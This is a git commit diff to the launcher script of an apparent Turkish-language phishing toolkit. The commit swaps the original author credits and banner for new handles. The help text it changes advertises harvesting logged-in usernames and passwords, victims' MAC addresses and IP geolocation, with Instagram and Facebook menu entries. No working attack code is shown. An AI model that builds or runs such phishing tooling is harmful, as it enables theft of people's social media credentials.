d1589678b6fcfb0004f7c46ea6d2603afeae5342
Draxy <44810925+EfeBeyM@users.noreply.github.com>
2020-08-11 02:08:02 +0300

    Update tst.sh

--- tst.sh
+++ tst.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 #!/bin/sh
-#Code:Yaman Efkar
-#Türk Siber Timi
-#İnstagram : @turksibertimi
-#Youtube : YamanEfkar
+#Code:'welø quiere morir &
+#Hell.
+#İnstagram : @efewq_
+#Youtube : Yakında ...
 clear
 case $1 in
 
@@ -15,7 +15,7 @@ case $1 in
 --user         (Giriş Yapılmış Username & Pass)
 --mac          (Giriş Yapanların Mac Adresleri)
 --location     (Belirtilen Ip Adresinin Yer Tespiti)
-bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)
+bash welo.sh & sh welo.sh (Phishing Toolu 'nu Çalıştırır)
    "
   ;;
 
@@ -27,7 +27,7 @@ bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)
 --user         (Giriş Yapılmış Username & Pass)
 --mac          (Giriş Yapanların Mac Adresleri)
 --location     (Belirtilen Ip Adresinin Yer Tespiti)
-bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)"
+bash welo.sh & sh welo.sh (Phishing Toolu 'nu Çalıştırır)"
 
   ;;
 
@@ -63,9 +63,9 @@ echo -e '\033[31;40;1m
 	────────────────█████████───────────────
 	──────────────█████████████─────────────
 
-	   \e[35m☾★ ☾★ ☾★ ☾★ YamanEfkar ☾★ ☾★ ☾★ ☾★	
-	 \e[31m☾★ ☾★ ☾★ ☾★ Türk Siber Timi ☾★ ☾★ ☾★ ☾★	
-  \e[32m☾★ ☾★ ☾★ ☾★ İnstagram : @turksibertimi ☾★ ☾★ ☾★ ☾★	
+	   \e[35m  ★ ★ ★ ★ 'welø quiere morir & ★ ★ ★ ★	
+	 \e[31m           ★ ★ ★ ★ Hell ★ ★ ★ ★	
+  \e[32m             ★ ★ ★ ★ İnstagram :@efewq_ ★ ★ ★ ★	
 '
 echo -e '
 \e[31m[01]\e[32mİnstagram			\e[31m[04]\e[32mFacebook
